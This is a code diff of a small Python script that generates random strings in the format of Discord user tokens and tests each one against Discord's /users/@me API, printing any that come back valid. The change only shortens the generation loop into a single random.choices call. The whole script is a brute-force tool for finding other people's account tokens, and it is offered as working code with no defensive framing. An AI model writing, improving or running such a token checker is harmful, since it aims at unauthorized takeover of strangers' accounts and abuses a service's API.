@@ -1,5 +1,5 @@
 from requests import get
-from random import choice
+from random import choices
 
 string = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_"
 
@@ -10,18 +10,7 @@ class color:
 	reset = '\033[0m'
 
 def start():
-	part1 = ""
-	part2 = ""
-	part3 = ""
-	for x in range(26):
-		part1 += choice(string)
-	if part1[0] == "-" or part1[0] == "_":
-		return
-	for x in range(6):
-		part2 += choice(string)
-	for x in range(38):
-		part3 += choice(string)
-	token = part1 + "." + part2 + "." + part3
+	token = "".join(choices(string, k = 26)) + "." + "".join(choices(string, k = 6)) + "." + "".join(choices(string, k = 38))
 	res = get('https://discord.com/api/v9/users/@me', headers = {'Authorization': token})
 	if res.status_code == 200:
 		print(f"{color.green}[VALID]{color.reset} - {token}")
